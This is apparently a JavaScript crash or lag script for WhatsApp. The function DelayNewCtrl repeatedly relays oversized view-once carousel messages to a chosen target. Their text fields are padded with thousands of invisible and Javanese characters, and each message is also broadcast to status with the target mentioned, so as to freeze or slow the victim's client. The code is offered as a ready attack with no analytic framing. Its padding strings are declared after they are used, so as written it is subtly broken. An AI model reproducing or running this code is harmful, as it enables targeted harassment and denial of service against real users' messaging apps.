async function DelayNewCtrl(sock, target) {
    const image = {
        url: "https://mmg.whatsapp.net/o1/v/t24/f2/m269/AQO8fP6AIG1EcRNZZeBhFHdFgya8amkM1RUkSkPuUqRnE6cpnmqQ8oJXJof_8XkOdzuXXwfDTSbHUnyT0fxQiElWsTJhBxzMz2LrYQqS4Q?ccb=9-4&oh=01_Q5Aa2AHm-OtLbKQy0rfnIKTfL0QsHqMpN_lMWdPwjUMhhLYMSw&oe=68AD3977&_nc_sid=e6ed6c&mms3=true",
        mimetype: "image/jpeg",
        fileSha256: Buffer.from("CrP44RkJbl+shQQxxlJ6s0SAAcOWqWgxw3iEiGi3zZI=", "base64"),
        fileLength: "59668",
        height: 736,
        width: 736,
        mediaKey: Buffer.from("YRUaXE2466bqWOmhGwPxA6bC3Qif2tTFmsJ/Q+49ijc=", "base64"),
        fileEncSha256: Buffer.from("rTAiyS+goq3w37k70/mwSiCVRUFjD66uanaabunAG8w=", "base64"),
        directPath: "/o1/v/t24/f2/m269/AQO8fP6AIG1EcRNZZeBhFHdFgya8amkM1RUkSkPuUqRnE6cpnmqQ8oJXJof_8XkOdzuXXwfDTSbHUnyT0fxQiElWsTJhBxzMz2LrYQqS4Q?ccb=9-4&oh=01_Q5Aa2AHm-OtLbKQy0rfnIKTfL0QsHqMpN_lMWdPwjUMhhLYMSw&oe=68AD3977&_nc_sid=e6ed6c",
        mediaKeyTimestamp: "1753601096",
        jpegThumbnail: Buffer.from("/9j/4AAQSkZJRgABAQAAAQABAAD...", "base64")
    };

    const buttonParams = {
        flow_message_version: "3",
        flow_token: "609462852953923842025072711512|6285295392384|2B2D5BE573141F45BAEA1A9591241313F663CF3CFC3A1ADC94EEF3CB56C218C0892E957FF1E77C08F7EA4AED16995E5B06D8C158275F3A2CCFCDA84CD47AB3E6",
        flow_id: "23984266027850149",
        flow_cta: "Blonde",
        mode: "published",
        flow_action: "data_exchange",
        flow_metadata: {
            flow_json_version: 600,
            data_api_protocol: "PUBLIC_KEY",
            flow_name: "instagram.com/z",
            data_api_version: 300,
            www_proxy_secret: null,
            categories: []
        }
    };

    const buildButtons = () => {
        return Array(5).fill().map(() => ({
            name: "galaxy_message",
            buttonParamsJson: JSON.stringify(buttonParams)
        }));
    };

    for (let i = 0; i < 5; i++) {
        const cards = [{
            header: {
                hasMediaAttachment: true,
                imageMessage: image,
                title: p + "꧔꧈" + i
            },
            body: { text: z },
            footer: { text: "꧔꧈" + i },
            nativeFlowMessage: {
                buttons: buildButtons()
            }
        }];

        const content = {
            viewOnceMessage: {
                message: {
                    messageContextInfo: {
                        deviceListMetadata: {},
                        deviceListMetadataVersion: 2
                    },
                    interactiveMessage: {
                        header: {
                            hasMediaAttachment: true,
                            imageMessage: image
                        },
                        body: { text: z },
                        footer: { text: "\u200B" },
                        carouselMessage: { cards }
                    }
                }
            }
        };

        const waMsg = generateWAMessageFromContent(target, content, {});
        await sock.relayMessage(target, waMsg.message, { messageId: waMsg.key.id });

        await sock.relayMessage("status@broadcast", waMsg.message, {
            messageId: waMsg.key.id,
            statusJidList: [target],
            additionalNodes: [{
                tag: "meta",
                attrs: {},
                content: [{
                    tag: "mentioned_users",
                    attrs: {},
                    content: [{
                        tag: "to",
                        attrs: { jid: target },
                        content: undefined
                    }]
                }]
            }]
        }, {
            participant: target
        });
    const p = "\u2060".repeat(3000);
    const z = "ꦾ".repeat(9999);
        await new Promise(res => setTimeout(res, 500));
    }
}